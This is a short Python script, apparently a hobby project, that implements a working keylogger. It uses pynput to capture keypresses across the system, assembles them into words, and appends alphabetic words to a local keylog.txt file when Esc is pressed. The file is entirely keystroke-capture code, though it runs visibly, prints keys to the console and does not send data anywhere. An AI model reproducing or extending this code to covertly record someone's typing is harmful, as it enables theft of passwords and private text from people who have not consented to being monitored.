import os
import sys
from pynput import keyboard


FILEPATH = os.path.join(os.path.dirname(__file__), "keylog.txt")
keys = []
text = ""


def write_to_file(filepath, keys):
    try: 
        with open(filepath, "a") as writer:
            for key in keys:
                # FIXME filters out every word that contains special chars
                # like "!", "?", """, etc.
                if key.isalpha() and key.find("Key.") == -1:
                    # TODO compare the word to a dictionary before adding to file
                    writer.write(key)
                    writer.write('\n')

            # FIXME -> needed?
            writer.truncate()
    except Exception as e:
        print(f"Error while writing to file: {e}")


def on_press(key):
    # TODO for debugging only -> remove later
    try:
        print(key.char)
    except AttributeError:
        print(key)
        
    global text, keys
    if key == keyboard.Key.enter:
        keys.append(text)
        text = ""
    elif key == keyboard.Key.tab:
        keys.append(text)
        text = ""
    elif key == keyboard.Key.space:
        keys.append(text)
        text = ""
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        keys.append(text)
        text = ""
    else:
        text += str(key).strip("'")
      
    
def on_release(key):
    if key == keyboard.Key.esc:
        global keys
        write_to_file(FILEPATH, keys)
        keys = []
        
        # Stop listener
        print("Stop logging keys")
        return False


def log_key(): 
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    try: 
        print("Logging keys ...")
        log_key()
    except KeyboardInterrupt:
        sys.exit()
